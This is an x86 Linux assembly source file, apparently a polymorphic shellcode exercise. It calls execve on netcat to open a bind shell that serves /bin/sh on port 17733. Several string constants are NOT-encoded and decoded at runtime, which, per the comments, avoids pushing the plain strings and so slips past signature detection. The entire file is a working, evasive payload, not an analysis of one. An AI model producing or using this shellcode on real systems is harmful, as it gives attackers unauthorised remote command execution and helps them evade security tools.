global _start

section .text
_start:
xor eax,eax				; zero out eax register
xor edx,edx				; zero out edx register
push 0x37373333  		; push (7733) on to stack

;objective is to push 0x3170762d  ( 1pv- ) on to stack ,rather than pushing directly onto stack following changes has been done

mov edx, 0xCE8F89D2		; 0xCE8F89D2 is moved to EDX register
not edx  				;not(0xCE8F89D2) = 0x3170762d
push edx				; 0x3170762d in EDX register is pushed onto stack

mov edx, esp			; pointer to arg is stored in edx register.

push eax				; push null to stack

; objective is to  push 0x68732f6e( hs/n) on to stack ,rather than pushing directly onto stack following changes has been done

mov ecx, 0x978CD091		; 0x978CD091 is moved to ECX register
not ecx					; not(0x978CD091) = 0x68732f6e
push ecx				; 0x68732f6e in ECX register is pushed onto stack
push 0x69622f65  		; push “ ib/e” onto stack
push 0x76766c2d  		;push “ vvl-“ onto stack
mov ecx,esp				; pointer to arg is stored in ecx reg

push eax				; push null onto stack

; objective is to   push 0x636e2f2f  (cn//) on to stack ,rather than pushing directly onto stack following changes has been done

mov ebx, 0x9C91D0D0		; 0x9C91D0D0 is moved to EBX register
not ebx       			;not(0x9C91D0D0) = 0x636e2f2f
push ebx				; 0x636e2f2f in EBX register is pushed onto stack
push 0x2f2f2f2f  		; push //// onto stack

; objective is to    push 0x6e69622f  ( nib/ ) on to stack ,rather than pushing directly onto stack following changes has been done

mov ebx, 0x91969DD0		; 0x91969DD0 is moved to EBXregister
not ebx					;not(0x91969DD0) = 0x6e69622f
;instead of directly pushing EBX onto stack using push ebx following manipulations has been made
mov dword [esp-4], ebx	; the value in EBX is placed in esp-4 
sub esp, 4				; esp is pointed to higher memory address by subtracting 4 
mov ebx, esp			;pointer to arg stored in ebx reg
push eax				; push null onto stack
push edx				;push value in edx onto stack 
push ecx				; push value in ecx onto stack
push ebx				; push value in ebx onto stack 
xor edx,edx				; clear out edx reg
xchg esp, ecx			; pointer to arg stored in ecx reg
mov al,11				; execve sys call number moved to eax reg
int 0x80				;sys call invoked

